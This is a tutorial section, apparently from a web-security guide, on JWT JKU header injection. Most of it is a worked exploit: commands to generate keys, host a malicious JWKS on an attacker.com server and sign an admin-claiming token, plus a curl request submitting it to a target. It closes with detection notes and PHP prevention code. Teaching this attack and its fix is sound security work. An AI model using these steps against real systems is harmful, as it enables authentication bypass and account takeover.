# 2.2 JKU Injection

## Goal

Force server to fetch attacker-controlled JWKS from attacker-hosted URL.

---

## How JKU Works

JKU = JWK Set URL. Server fetches keys from this URL:

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/malicious-jwks.json"
}
```

**Vulnerability:** If server fetches and trusts keys from JKU, attacker can host malicious keys!

---

## Exploitation Steps

### Step 1: Generate RSA Keypair

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

### Step 2: Create Malicious JWKS File

Create `malicious-jwks.json`:
```json
{
  "keys": [{
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "n": "0vx7agoebGc9jcsQVI30eW07ijqp...",
    "e": "AQAB",
    "kid": "attacker-key-1"
  }]
}
```

(Use same key conversion as JWK Injection)

### Step 3: Host on Attacker Server

```bash
# Simple Python HTTP server
python3 -m http.server 8000
# Now malicious-jwks.json is accessible

# Or use ngrok for public URL
ngrok http 8000
```

### Step 4: Create & Sign Token

```python
import jwt

payload = {"role":"admin", "sub":"123"}

headers = {
    "alg": "RS256",
    "jku": "https://attacker.com:8000/malicious-jwks.json",
    "kid": "attacker-key-1"
}

token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
print(token)
```

### Step 5: Submit Token

```bash
curl -H "Authorization: Bearer TOKEN" \
     https://target.com/admin
```

### Step 6: Server Processes

1. Server receives token with jku
2. Server fetches keys from attacker URL
3. Gets attacker's public key
4. Validates signature (matches!)
5. Accepts token

---

## Why It Works

```
Normal flow:
1. Get kid from header
2. Look up key from /.well-known/jwks.json
3. Verify signature

Vulnerable flow:
1. Get jku from header
2. Fetch from attacker's URL
3. Get attacker's key
4. Verify signature with attacker's key
5. Always validates!
```

---

## Real Scenario

**Target:** OAuth provider

**Attack:**
1. Generate keys
2. Host JWKS.json on attacker server
3. Create JWT with jku pointing to attacker
4. Submit to target
5. Target fetches from attacker URL
6. Uses attacker's key
7. Signature validates
8. Full account takeover!

## Detection Note

This attack may leave logs:
- HTTP access logs to malicious-jwks.json
- Outbound request from target
- Can be detected if monitored

---

## Prevention

✅ **GOOD:**
```php
// Whitelist JKU domains
$allowed_jku = ['https://auth.company.com/.well-known/jwks.json'];
if (!in_array($jku, $allowed_jku)) {
    die('JKU not allowed');
}
```

✅ **BETTER:**
```php
// Don't use jku parameter
// Fetch keys once at startup
$keys = fetch_from_well_known_endpoint();
JWT::verify($token, $keys);
```
